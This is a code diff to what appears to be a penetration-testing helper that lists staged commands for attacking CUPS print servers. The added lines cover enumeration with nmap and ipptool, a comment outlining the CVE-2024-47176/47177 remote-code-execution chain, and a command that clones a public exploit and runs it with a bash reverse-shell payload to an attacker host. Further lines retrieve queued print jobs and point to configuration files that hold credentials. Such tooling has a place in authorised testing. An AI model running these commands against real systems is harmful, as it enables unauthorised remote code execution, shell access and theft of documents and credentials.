@@ -5105,14 +5105,19 @@ _STEP_COMMANDS = {
     "cups": {
         1: [
             "curl -sk http://<RHOST>:631/",
-            "nmap -p631 --script http-title <RHOST>",
+            "nmap -p631 --script http-title,cups-info,cups-queue-info <RHOST>",
+            "ipptool -tv ipp://<RHOST>:631/ get-printer-attributes.test   # IPP version/model/attrs",
         ],
         2: [
-            "# CVE-2024-47176 chain: crafted IPP printer → RCE (evaluate carefully)",
+            "# CVE-2024-47176/47177 chain: trigger cups-browsed on UDP/631 -> it fetches your IPP printer -> foomatic-rip cmd injection -> RCE (needs attacker-hosted IPP + connect-back)",
+            "git clone https://github.com/l0n3m4n/CVE-2024-47176 && python3 CVE-2024-47176/exploit.py -t <RHOST> -c 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'",
+            "msfconsole -q -x 'search cups_browsed; exit'   # Metasploit RCE module for cups-browsed",
             "searchsploit cups",
         ],
         3: [
             "curl -sk http://<RHOST>:631/printers/",
+            "curl -sk http://<RHOST>:631/jobs/   # captured/queued print jobs (may leak documents)",
+            "# read config for creds/printer URIs: /etc/cups/cupsd.conf and /etc/cups/printers.conf",
         ],
         4: [
             "# HackTricks CUPS: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ipp",
